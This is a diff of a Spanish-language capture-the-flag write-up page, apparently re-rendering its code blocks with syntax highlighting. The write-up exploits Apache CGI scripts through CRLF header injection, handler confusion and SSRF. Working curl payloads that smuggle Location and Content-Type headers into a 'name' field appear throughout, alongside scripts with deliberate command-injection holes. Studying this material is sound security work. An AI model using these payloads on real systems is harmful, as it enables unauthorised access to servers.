@@ -194,7 +194,7 @@ A grandes rasgos, el reto requería explotar una inyección CRLF, una vulnerabil
       
       #<a href="https://albertnath.github.io/hfc-blog/tags/writeup/">Writeup</a>&nbsp;
       
-      #<a href="https://albertnath.github.io/hfc-blog/tags/web-hacking/">Web hacking</a>&nbsp;
+      #<a href="https://albertnath.github.io/hfc-blog/tags/web/">Web</a>&nbsp;
       
     </span>
   
@@ -240,102 +240,102 @@ Allow from 127.0.0.1
 Allow from ::1
 &lt;/Location&gt;
 </code></pre><p>A continuación, se muestra el código fuente de ambos scripts y algunas conclusiones a las que llegué después de analizarlo.</p>
-<pre tabindex="0"><code>#!/usr/bin/env python3
-
-import cgi
-import os
-import re
-
-def is_domain(target):
-return re.match(r&#39;^(?!-)[a-zA-Z0-9-]{1,63}(?&lt;!-)\.[a-zA-Z]{2,63}$&#39;, target)
-
-form = cgi.FieldStorage()
-name = form.getvalue(&#39;name&#39;)
-target = form.getvalue(&#39;target&#39;)
-if not name or not target:
-print(&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;)
-
-elif is_domain(target):
-count = 1 # Increase this for an actual attack
-os.popen(f&#39;ping -c {count} {target}&#39;)
-print(f&#39;Location: ../?result=Succesfully attacked {target}!&#39;)
-else:
-print(f&#39;Location: ../?error=Hey {name}, watch it!&#39;)
-
-print(&#39;Content-Type: text/html&#39;)
-print()
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cgi
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_domain</span>(target):
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> re<span style="color:#f92672">.</span><span style="color:#66d9ef">match</span>(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;^(?!-)[a-zA-Z0-9-]{1,63}(?&lt;!-)\.[a-zA-Z]{2,63}$&#39;</span>, target)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>form <span style="color:#f92672">=</span> cgi<span style="color:#f92672">.</span>FieldStorage()
+</span></span><span style="display:flex;"><span>name <span style="color:#f92672">=</span> form<span style="color:#f92672">.</span>getvalue(<span style="color:#e6db74">&#39;name&#39;</span>)
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> form<span style="color:#f92672">.</span>getvalue(<span style="color:#e6db74">&#39;target&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> name <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> target:
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> is_domain(target):
+</span></span><span style="display:flex;"><span>  count <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#75715e"># Increase this for an actual attack</span>
+</span></span><span style="display:flex;"><span>  os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ping -c </span><span style="color:#e6db74">{</span>count<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Location: ../?result=Succesfully attacked </span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Location: ../?error=Hey </span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">, watch it!&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Content-Type: text/html&#39;</span>)
+</span></span><span style="display:flex;"><span>print()
+</span></span></code></pre></div><ul>
 <li>Se utiliza el comando <code>ping</code> para atacar el servicio que se le indica.</li>
 <li>Parece haber una inyección de comandos, pues el parámetro <code>target</code> se usa en la función <code>os.popen()</code>. Sin embargo, el mismo parámetro primero se verifica con una expresión regular y, si no tiene el formato de un nombre de dominio, no se ejecuta la función.</li>
 <li>En caso de no pasar la verificación, la respuesta HTTP será una redirección a través del encabezado <code>Location</code>, en donde se envía un mensaje de error concatenando el nombre del usuario. Al hacer esta concatenación en un encabezado, podría ser vulnerable a una inyección <em>CRLF</em>.</li>
 <li>Una interacción con este recurso se muestra a continuación, forzando un error al enviar un nombre de dominio inválido.</li>
 </ul>
-<pre tabindex="0"><code>$ curl &#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v&#39;
-&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
-&lt;html&gt;&lt;head&gt;
-&lt;title&gt;302 Found&lt;/title&gt;
-&lt;/head&gt;&lt;body&gt;
-&lt;h1&gt;Found&lt;/h1&gt;
-&lt;p&gt;The document has moved &lt;a href=&#34;../?error=Hey v, watch it!&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;hr&gt;
-&lt;address&gt;Apache/2.4.54 (Debian) Server at 83.136.249.227 Port 46378&lt;/address&gt;
-&lt;/body&gt;&lt;/html&gt;
-</code></pre><p><strong>attack-ip:</strong></p>
-<pre tabindex="0"><code>#!/usr/bin/env python3
-
-import cgi
-import os
-from ipaddress import ip_address
-
-form = cgi.FieldStorage()
-name = form.getvalue(&#39;name&#39;)
-target = form.getvalue(&#39;target&#39;)
-
-if not name or not target:
-print(&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;)
-try:
-count = 1 # Increase this for an actual attack
-os.popen(f&#39;ping -c {count} {ip_address(target)}&#39;)
-print(f&#39;Location: ../?result=Succesfully attacked {target}!&#39;)
-except:
-print(f&#39;Location: ../?error=Hey {name}, watch it!&#39;)
-
-print(&#39;Content-Type: text/html&#39;)
-print()
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl <span style="color:#e6db74">&#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v&#39;</span>
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
+</span></span><span style="display:flex;"><span>&lt;title&gt;302 Found&lt;/title&gt;
+</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
+</span></span><span style="display:flex;"><span>&lt;h1&gt;Found&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>&lt;p&gt;The document has moved &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../?error=Hey v, watch it!&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>&lt;hr&gt;
+</span></span><span style="display:flex;"><span>&lt;address&gt;Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span> Server at 83.136.249.227 Port 46378&lt;/address&gt;
+</span></span><span style="display:flex;"><span>&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></div><p><strong>attack-ip:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> cgi
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ipaddress <span style="color:#f92672">import</span> ip_address
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>form <span style="color:#f92672">=</span> cgi<span style="color:#f92672">.</span>FieldStorage()
+</span></span><span style="display:flex;"><span>name <span style="color:#f92672">=</span> form<span style="color:#f92672">.</span>getvalue(<span style="color:#e6db74">&#39;name&#39;</span>)
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> form<span style="color:#f92672">.</span>getvalue(<span style="color:#e6db74">&#39;target&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> name <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> target:
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#39;Location: ../?error=Hey, you need to provide a name and a target!&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>  count <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#75715e"># Increase this for an actual attack</span>
+</span></span><span style="display:flex;"><span>  os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ping -c </span><span style="color:#e6db74">{</span>count<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>ip_address(target)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Location: ../?result=Succesfully attacked </span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">!&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Location: ../?error=Hey </span><span style="color:#e6db74">{</span>name<span style="color:#e6db74">}</span><span style="color:#e6db74">, watch it!&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;Content-Type: text/html&#39;</span>)
+</span></span><span style="display:flex;"><span>print()
+</span></span></code></pre></div><ul>
 <li>El funcionamiento es muy similar al caso anterior, pero con pequeñas variaciones.</li>
 <li>Se utiliza nuevamente el comando <code>ping</code> para atacar la dirección IP indicada.</li>
 <li>En este caso, también parece haber una inyección de comandos, pues el parámetro <code>target</code> se usa en la función <code>os.popen()</code>, pero en este caso hay una validación con la función <code>ip_address()</code>. Esta función genera una excepción si la cadena recibida no tiene el formato de una dirección IPv4 o IPv6 válida.</li>
 <li>En caso de generarse la excepción, no realiza el ataque y envía una redirección con un mensaje de error en el encabezado <code>Location</code>.</li>
 </ul>
 <p>Llegados a este punto, tenía claro que el único recurso con el que podría interactuar directamente era <code>/cgi-bin/attack-domain</code> y que debía lograr interactuar con <code>/cgi-bin/attack-ip</code> (ya que su acceso estaba limitado). Aunque buscaba alguna manera de forzar un <em>SSRF</em>, al inicio únicamente era capaz de inyectar encabezados HTTP en la respuesta. Esto lo muestro a continuación, logrando que la respuesta incluyera el nuevo encabezado <code>New-Header: HFC</code> inyectando los caracteres de retorno de carro y salto de línea <code>(%0d%0a)</code>.</p>
-<pre tabindex="0"><code>$ curl -i &#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aNew-Header:HFC%0d%0a%0d%0a&#39;
-HTTP/1.1 302 Found
-Date: Wed, 26 Mar 2025 03:14:46 GMT
-Server: Apache/2.4.54 (Debian)
-New-Header: HFC
-Location: ../?error=Hey v
-Content-Length: 282
-Content-Type: text/html; charset=iso-8859-1
-
-&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
-&lt;html&gt;&lt;head&gt;
-&lt;title&gt;302 Found&lt;/title&gt;
-&lt;/head&gt;&lt;body&gt;
-&lt;h1&gt;Found&lt;/h1&gt;
-&lt;p&gt;The document has moved &lt;a href=&#34;../?error=Hey v&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;hr&gt;
-&lt;--REDACTED--&gt;
-</code></pre><p>Después de un buen rato de buscar algún recurso que pudiera servirme, llegué a este <a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">sitio</a>. Aquí se detalla el término de &ldquo;ambigüedad semántica&rdquo; en servidores Apache. A grandes rasgos, explica que Apache funciona mediante una gran cantidad de módulos. Estos módulos no necesariamente tienen una forma estandarizada de interpretar los campos que van a procesar, provocando ambigüedades en cómo lo manipulan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl -i <span style="color:#e6db74">&#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aNew-Header:HFC%0d%0a%0d%0a&#39;</span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">302</span> Found
+</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">26</span> Mar <span style="color:#ae81ff">2025</span> 03:14:46 GMT
+</span></span><span style="display:flex;"><span>Server: Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>New-Header: HFC
+</span></span><span style="display:flex;"><span>Location: ../?error<span style="color:#f92672">=</span>Hey v
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">282</span>
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
+</span></span><span style="display:flex;"><span>&lt;title&gt;302 Found&lt;/title&gt;
+</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
+</span></span><span style="display:flex;"><span>&lt;h1&gt;Found&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>&lt;p&gt;The document has moved &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../?error=Hey v&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>&lt;hr&gt;
+</span></span><span style="display:flex;"><span>&lt;--REDACTED--&gt;
+</span></span></code></pre></div><p>Después de un buen rato de buscar algún recurso que pudiera servirme, llegué a este <a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-en/">sitio</a>. Aquí se detalla el término de &ldquo;ambigüedad semántica&rdquo; en servidores Apache. A grandes rasgos, explica que Apache funciona mediante una gran cantidad de módulos. Estos módulos no necesariamente tienen una forma estandarizada de interpretar los campos que van a procesar, provocando ambigüedades en cómo lo manipulan.</p>
 <p>El sitio detalla 3 tipos diferentes de ataques desarrollados a partir de dicha ambigüedad, pero para este reto utilicé únicamente el llamado <em>Handler Confusion</em>, donde se busca invocar algún <em>handler</em> de Apache de forma arbitraria. Para comprender correctamente el origen e implicaciones del problema, se recomienda leer el artículo original. A continuación, únicamente agregaré una explicación muy resumida de esto, esperando que sea suficiente para comprender la solución al reto.</p>
 <p>El autor explica que al utilizar el módulo <code>mod_php</code>, hay dos directivas que se parecen mucho en funcionalidad, pero que representan campos diferentes dentro de la estructura de httpd:</p>
 <p><strong>Directivas:</strong></p>
-<pre tabindex="0"><code>AddHandler application/x-httpd-php .php
-AddType    application/x-httpd-php .php
-</code></pre><p><strong>Sintaxis:</strong></p>
-<pre tabindex="0"><code>AddHandler handler-name extensión [extensión] ...
-AddType media-type extensión [extensión] ...
-</code></pre><p>Aunque tienen una funcionalidad muy similar, realmente <code>handler-name</code> corresponde a la estructura <code>r-&gt;handler</code> y <code>media-type</code> corresponde a <code>r-&gt;content_type</code> dentro de httpd. Algo curioso (y por lo que se parecen tanto) es que tras bambalinas, <code>media-type</code> se termina convirtiendo en <code>handler-name</code>. El autor indica que, en teoría, si se logra controlar el encabezado <code>Content-Type</code> en la respuesta del servidor, es posible invocar cualquier handler de Apache de forma arbitraria.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>AddHandler application/x-httpd-php .php
+</span></span><span style="display:flex;"><span>AddType    application/x-httpd-php .php
+</span></span></code></pre></div><p><strong>Sintaxis:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>AddHandler handler-name extensión <span style="color:#f92672">[</span>extensión<span style="color:#f92672">]</span> ...
+</span></span><span style="display:flex;"><span>AddType media-type extensión <span style="color:#f92672">[</span>extensión<span style="color:#f92672">]</span> ...
+</span></span></code></pre></div><p>Aunque tienen una funcionalidad muy similar, realmente <code>handler-name</code> corresponde a la estructura <code>r-&gt;handler</code> y <code>media-type</code> corresponde a <code>r-&gt;content_type</code> dentro de httpd. Algo curioso (y por lo que se parecen tanto) es que tras bambalinas, <code>media-type</code> se termina convirtiendo en <code>handler-name</code>. El autor indica que, en teoría, si se logra controlar el encabezado <code>Content-Type</code> en la respuesta del servidor, es posible invocar cualquier handler de Apache de forma arbitraria.</p>
 <p>Sin embargo, el flujo en el que se manejan las peticiones provoca que la conversión de estructuras no se efectúe, a menos que sea el propio servidor quien inicie una nueva petición internamente. Afortunadamente para nosotros, hay escenarios en los que el servidor hace nuevas peticiones internas, uno de ellos es cuando usa el módulo <code>mod_cgi</code>. Si el encabezado HTTP <code>Location</code> inicia con el caracter &lsquo;/&rsquo;, Apache va a tratar este escenario como una redirección del lado del servidor para poder interactuar con el script CGI.</p>
 <p>Se puede concluir que para poder invocar cualquier handler de Apache, se necesitan cumplir los siguientes requisitos:</p>
 <ul>
@@ -350,101 +350,101 @@ AddType media-type extensión [extensión] ...
 </li>
 </ul>
 <p>Con todo en su lugar, llegó el momento de usar un handler distinto. Específicamente, se usó <code>server-status</code>, con el único fin de demostrar la viabilidad de la técnica. Como se muestra a continuación, el ataque fue exitoso y fue posible acceder a información del estado del servidor, como consumo de CPU, tráfico total, etc.</p>
-<pre tabindex="0"><code>$ curl -i &#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:server-status%0d%0a%0d%0a&#39;
-HTTP/1.1 200 OK
-Date: Wed, 26 Mar 2025 03:16:46 GMT
-Server: Apache/2.4.54 (Debian)
-Vary: Accept-Encoding
-Content-Length: 4536
-Content-Type: text/html; charset=ISO-8859-1
-
-&lt;!DOCTYPE HTML PUBLIC &#34;-//W3C//DTD HTML 3.2 Final//EN&#34;&gt;
-&lt;html&gt;&lt;head&gt;
-&lt;title&gt;Apache Status&lt;/title&gt;
-&lt;/head&gt;&lt;body&gt;
-&lt;h1&gt;Apache Server Status for 83.136.249.227 (via 192.168.63.136)&lt;/h1&gt;
-
-&lt;dl&gt;&lt;dt&gt;Server Version: Apache/2.4.54 (Debian) PHP/7.4.33&lt;/dt&gt;
-&lt;dt&gt;Server MPM: prefork&lt;/dt&gt;
-&lt;dt&gt;Server Built: 2022-06-09T04:26:43
-&lt;/dt&gt;&lt;/dl&gt;&lt;hr /&gt;&lt;dl&gt;
-&lt;dt&gt;Current Time: Wednesday, 26-Mar-2025 03:16:47 UTC&lt;/dt&gt;
-&lt;dt&gt;Restart Time: Wednesday, 26-Mar-2025 03:04:40 UTC&lt;/dt&gt;
-&lt;dt&gt;Parent Server Config. Generation: 1&lt;/dt&gt;
-&lt;dt&gt;Parent Server MPM Generation: 0&lt;/dt&gt;
-&lt;dt&gt;Server uptime:  12 minutes 6 seconds&lt;/dt&gt;
-&lt;dt&gt;Server load: 0.15 0.23 0.20&lt;/dt&gt;
-&lt;dt&gt;Total accesses: 7 - Total Traffic: 4 kB - Total Duration: 503&lt;/dt&gt;
-&lt;dt&gt;CPU Usage: u.03 s.03 cu.02 cs.01 - .0124% CPU load&lt;/dt&gt;
-&lt;dt&gt;.00964 requests/sec - 5 B/second - 585 B/request - 71.8571 ms/request&lt;/dt&gt;
-&lt;dt&gt;1 requests currently being processed, 5 idle workers&lt;/dt&gt;
-&lt;--REDACTED--&gt;
-</code></pre><p>Una vez confirmado, usé el handler <code>proxy</code> para forzar un <em>SSRF</em> completo, es decir, teniendo control sobre el destino, recurso, parámetros y encabezados de la petición. De esta manera, finalmente fue posible interactuar con <code>attack-ip</code> (pues la petición se origina desde el propio servidor).</p>
-<pre tabindex="0"><code>$ curl -i &#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%26name=v%0d%0a%0d%0a&#39;
-HTTP/1.1 302 Found
-Date: Wed, 26 Mar 2025 03:19:21 GMT
-Server: Apache/2.4.54 (Debian)
-Location: ../?result=Succesfully attacked 127.0.0.1!
-Content-Length: 301
-Content-Type: text/html; charset=iso-8859-1
-
-&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;
-&lt;html&gt;&lt;head&gt;
-&lt;title&gt;302 Found&lt;/title&gt;
-&lt;/head&gt;&lt;body&gt;
-&lt;h1&gt;Found&lt;/h1&gt;
-&lt;p&gt;The document has moved &lt;a href=&#34;../?result=Succesfully attacked 127.0.0.1!&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;hr&gt;
-&lt;address&gt;Apache/2.4.54 (Debian) Server at 127.0.0.1 Port 80&lt;/address&gt;
-&lt;/body&gt;&lt;/html&gt;
-</code></pre><p>La parte final del reto consistía en explotar una vulnerabilidad dentro de <code>attack-ip</code> con el fin de inyectar comandos. Recordemos que el parámetro <code>target</code> es validado con la función <code>ip_address()</code>, la cual genera una excepción si la cadena no tiene un formato de dirección IPv4 o IPv6. A continuación, muestro un par de ejemplos de esta funcionalidad:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl -i <span style="color:#e6db74">&#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:server-status%0d%0a%0d%0a&#39;</span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">26</span> Mar <span style="color:#ae81ff">2025</span> 03:16:46 GMT
+</span></span><span style="display:flex;"><span>Server: Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Vary: Accept-Encoding
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">4536</span>
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>ISO-8859-1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
+</span></span><span style="display:flex;"><span>&lt;title&gt;Apache Status&lt;/title&gt;
+</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
+</span></span><span style="display:flex;"><span>&lt;h1&gt;Apache Server Status <span style="color:#66d9ef">for</span> 83.136.249.227 <span style="color:#f92672">(</span>via 192.168.63.136<span style="color:#f92672">)</span>&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;dl&gt;&lt;dt&gt;Server Version: Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span> PHP/7.4.33&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;Server MPM: prefork&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;Server Built: 2022-06-09T04:26:43
+</span></span><span style="display:flex;"><span>&lt;/dt&gt;&lt;/dl&gt;&lt;hr /&gt;&lt;dl&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;Current Time: Wednesday, 26-Mar-2025 03:16:47 UTC&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;Restart Time: Wednesday, 26-Mar-2025 03:04:40 UTC&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;Parent Server Config. Generation: 1&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;Parent Server MPM Generation: 0&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;Server uptime:  <span style="color:#ae81ff">12</span> minutes <span style="color:#ae81ff">6</span> seconds&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;Server load: 0.15 0.23 0.20&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;Total accesses: <span style="color:#ae81ff">7</span> - Total Traffic: <span style="color:#ae81ff">4</span> kB - Total Duration: 503&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;CPU Usage: u.03 s.03 cu.02 cs.01 - .0124% CPU load&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;.00964 requests/sec - <span style="color:#ae81ff">5</span> B/second - <span style="color:#ae81ff">585</span> B/request - 71.8571 ms/request&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;dt&gt;1 requests currently being processed, <span style="color:#ae81ff">5</span> idle workers&lt;/dt&gt;
+</span></span><span style="display:flex;"><span>&lt;--REDACTED--&gt;
+</span></span></code></pre></div><p>Una vez confirmado, usé el handler <code>proxy</code> para forzar un <em>SSRF</em> completo, es decir, teniendo control sobre el destino, recurso, parámetros y encabezados de la petición. De esta manera, finalmente fue posible interactuar con <code>attack-ip</code> (pues la petición se origina desde el propio servidor).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ curl -i <span style="color:#e6db74">&#39;http://83.136.249.227:46378/cgi-bin/attack-domain?target=x&amp;name=v%0d%0aLocation:/hfc%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=127.0.0.1%26name=v%0d%0a%0d%0a&#39;</span>
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">302</span> Found
+</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">26</span> Mar <span style="color:#ae81ff">2025</span> 03:19:21 GMT
+</span></span><span style="display:flex;"><span>Server: Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Location: ../?result<span style="color:#f92672">=</span>Succesfully attacked 127.0.0.1!
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">301</span>
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;html&gt;&lt;head&gt;
+</span></span><span style="display:flex;"><span>&lt;title&gt;302 Found&lt;/title&gt;
+</span></span><span style="display:flex;"><span>&lt;/head&gt;&lt;body&gt;
+</span></span><span style="display:flex;"><span>&lt;h1&gt;Found&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>&lt;p&gt;The document has moved &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../?result=Succesfully attacked 127.0.0.1!&#34;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>&lt;hr&gt;
+</span></span><span style="display:flex;"><span>&lt;address&gt;Apache/2.4.54 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span> Server at 127.0.0.1 Port 80&lt;/address&gt;
+</span></span><span style="display:flex;"><span>&lt;/body&gt;&lt;/html&gt;
+</span></span></code></pre></div><p>La parte final del reto consistía en explotar una vulnerabilidad dentro de <code>attack-ip</code> con el fin de inyectar comandos. Recordemos que el parámetro <code>target</code> es validado con la función <code>ip_address()</code>, la cual genera una excepción si la cadena no tiene un formato de dirección IPv4 o IPv6. A continuación, muestro un par de ejemplos de esta funcionalidad:</p>
 <p><strong>Dirección IPv4 válida:</strong></p>
-<pre tabindex="0"><code>from ipaddress import ip_address
-print(ip_address(&#39;127.0.0.1&#39;))
-</code></pre><p><strong>Resultado:</strong></p>
-<pre tabindex="0"><code>127.0.0.1
